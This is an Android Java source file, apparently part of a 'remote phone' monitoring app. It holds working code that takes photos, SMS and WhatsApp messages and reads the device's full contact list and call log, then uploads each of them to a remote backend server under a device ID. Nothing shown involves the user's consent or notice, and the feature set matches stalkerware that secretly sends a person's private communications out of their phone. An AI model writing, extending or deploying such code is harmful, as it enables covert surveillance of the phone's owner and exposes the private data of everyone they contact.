package com.exemplo.remotephone;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Log;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import okhttp3.*;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;

public class UploadHelper {
    public static void handleCapturedPhoto(Context ctx, Intent data) {
        Bitmap photo = (Bitmap) data.getExtras().get("data");
        try {
            File dir = new File(ctx.getExternalFilesDir(Environment.DIRECTORY_PICTURES),
                                "RemotePhone");
            if (!dir.exists()) dir.mkdirs();
            File file = new File(dir, "IMG_"+System.currentTimeMillis()+".jpg");
            try (FileOutputStream out = new FileOutputStream(file)) {
                photo.compress(Bitmap.CompressFormat.JPEG, 90, out);
            }
            uploadPhoto(ctx, file);
        } catch (Exception e) { Log.e("UploadHelper","Foto erro",e); }
    }

    public static void uploadPhoto(Context ctx, File file) {
        OkHttpClient client = new OkHttpClient();
        RequestBody body = new MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("photo", file.getName(),
                RequestBody.create(file, MediaType.get("image/jpeg")))
            .build();
        String url = "https://remote-phone-backend.onrender.com/devices/"
                     + DeviceManager.getDeviceId(ctx)
                     + "/upload-photo";
        Request req = new Request.Builder()
            .url(url)
            .addHeader("Authorization","Bearer "+AuthManager.getToken(ctx))
            .post(body).build();
        client.newCall(req).enqueue(simpleCallback("Foto"));
    }

    public static void uploadSms(Context ctx, String sender, String body, long ts) {
        OkHttpClient client = new OkHttpClient();
        RequestBody rb = new FormBody.Builder()
            .add("sender", sender)
            .add("body", body)
            .add("timestamp", String.valueOf(ts))
            .build();
        String url = "https://remote-phone-backend.onrender.com/devices/"
                     + DeviceManager.getDeviceId(ctx)
                     + "/upload-sms";
        Request req = new Request.Builder()
            .url(url)
            .addHeader("Authorization","Bearer "+AuthManager.getToken(ctx))
            .post(rb).build();
        client.newCall(req).enqueue(simpleCallback("SMS"));
    }

    public static void uploadContacts(Context ctx) {
        OkHttpClient client = new OkHttpClient();
        JSONArray arr = new JSONArray();
        Cursor cursor = ctx.getContentResolver().query(
          ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
          new String[]{
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
          }, null, null, null
        );
        if (cursor!=null) {
          while(cursor.moveToNext()) {
            try {
              JSONObject o = new JSONObject();
              o.put("name", cursor.getString(0));
              o.put("number", cursor.getString(1));
              arr.put(o);
            } catch(Exception ignored){}
          }
          cursor.close();
        }
        RequestBody rb = RequestBody.create(
          arr.toString(), MediaType.get("application/json"));
        String url = "https://remote-phone-backend.onrender.com/devices/"
                     + DeviceManager.getDeviceId(ctx)
                     + "/upload-contacts";
        Request req = new Request.Builder()
            .url(url)
            .addHeader("Authorization","Bearer "+AuthManager.getToken(ctx))
            .post(rb).build();
        client.newCall(req).enqueue(simpleCallback("Contacts"));
    }

    public static void uploadCallLog(Context ctx) {
        OkHttpClient client = new OkHttpClient();
        JSONArray arr = new JSONArray();
        Cursor cursor = ctx.getContentResolver().query(
          CallLog.Calls.CONTENT_URI, null, null, null,
          CallLog.Calls.DATE+" DESC"
        );
        if (cursor!=null) {
          while(cursor.moveToNext()) {
            try {
              JSONObject o = new JSONObject();
              o.put("number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
              o.put("type", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));
              o.put("date", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)));
              o.put("duration", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION)));
              arr.put(o);
            } catch(Exception ignored){}
          }
          cursor.close();
        }
        RequestBody rb = RequestBody.create(
          arr.toString(), MediaType.get("application/json"));
        String url = "https://remote-phone-backend.onrender.com/devices/"
                     + DeviceManager.getDeviceId(ctx)
                     + "/upload-calllog";
        Request req = new Request.Builder()
            .url(url)
            .addHeader("Authorization","Bearer "+AuthManager.getToken(ctx))
            .post(rb).build();
        client.newCall(req).enqueue(simpleCallback("CallLog"));
    }

    public static void uploadWhatsApp(Context ctx, String s, String m, long ts) {
        OkHttpClient client = new OkHttpClient();
        RequestBody rb = new FormBody.Builder()
            .add("sender", s)
            .add("message", m)
            .add("timestamp", String.valueOf(ts))
            .build();
        String url = "https://remote-phone-backend.onrender.com/devices/"
                     + DeviceManager.getDeviceId(ctx)
                     + "/upload-whatsapp";
        Request req = new Request.Builder()
            .url(url)
            .addHeader("Authorization","Bearer "+AuthManager.getToken(ctx))
            .post(rb).build();
        client.newCall(req).enqueue(simpleCallback("WhatsApp"));
    }

    private static Callback simpleCallback(String tag) {
        return new Callback(){
          @Override public void onFailure(Call c, IOException e) {
            Log.e("UploadHelper", tag+" falhou: "+e.getMessage());
          }
          @Override public void onResponse(Call c, Response r) throws IOException {
            Log.d("UploadHelper", tag+" OK: "+r.body().string());
          }
        };
    }
}
